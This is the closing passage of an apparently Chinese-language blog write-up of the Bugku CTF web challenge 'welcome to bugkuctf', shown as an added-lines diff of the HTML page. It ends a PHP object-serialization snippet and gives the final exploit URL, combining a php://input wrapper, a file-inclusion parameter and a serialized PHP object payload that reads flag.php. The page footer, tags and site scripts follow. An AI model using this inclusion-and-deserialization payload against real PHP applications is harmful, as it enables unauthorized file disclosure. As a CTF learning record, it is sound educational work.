class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;good&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$f</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$f</span>-&gt;file = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$f</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>根据以上所有的分析，可以将 payload 总结如下：</p>
+<p><strong><code>http://120.24.86.145:8006/test1/?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></strong></p>
+<p>最后别忘了在请求主体中提交字符串 <code>welcome to the bugkuctf</code> 喔，提交后得到 flag：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/bugku-ctf-web-welcome-to-bugkuctf/flag.png" alt="flag"></p>
+<p>若有不足或错误之处劳烦指出，欢迎有疑问的朋友前来留言讨论。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>Cipher Saw
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://ciphersaw.me/2018/01/03/bugku-ctf-web-welcome-to-bugkuctf/" title="【Bugku CTF】 Web —— welcome to bugkuctf">https://ciphersaw.me/2018/01/03/bugku-ctf-web-welcome-to-bugkuctf/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Bugku/" rel="tag"># Bugku</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/Writeup/" rel="tag"># Writeup</a>
+              <a href="/tags/Web/" rel="tag"># Web</a>
+              <a href="/tags/Audit/" rel="tag"># Audit</a>
+              <a href="/tags/PHP/" rel="tag"># PHP</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2017/12/26/bugku-ctf-web-never-give-up/" rel="prev" title="【Bugku CTF】 Web —— never give up">
+                  <i class="fa fa-chevron-left"></i> 【Bugku CTF】 Web —— never give up
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2018/03/06/ichunqiu-pentest-introduction-really-simple/" rel="next" title="【i春秋】渗透测试入门 —— 真的很简单">
+                  【i春秋】渗透测试入门 —— 真的很简单 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  <div class="comments" id="disqus_thread">
+    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+  </div>
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-space-shuttle"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cipher Saw</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+  
+
+
+  <script class="next-config" data-name="leancloud_visitors" type="application/json">{"enable":true,"app_id":"KWe6NtO4vhgQR3IfB99JElre-gzGzoHsz","app_key":"7nrrRDyHHUMcx03upUALYKIQ","server_url":null,"security":false}</script>
+  <script src="/js/third-party/statistics/lean-analytics.js"></script>
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<script class="next-config" data-name="disqus" type="application/json">{"enable":true,"shortname":"ciphersaw","count":false,"i18n":{"disqus":"disqus"}}</script>
+<script src="/js/third-party/comments/disqus.js"></script>
+
+</body>
+</html>
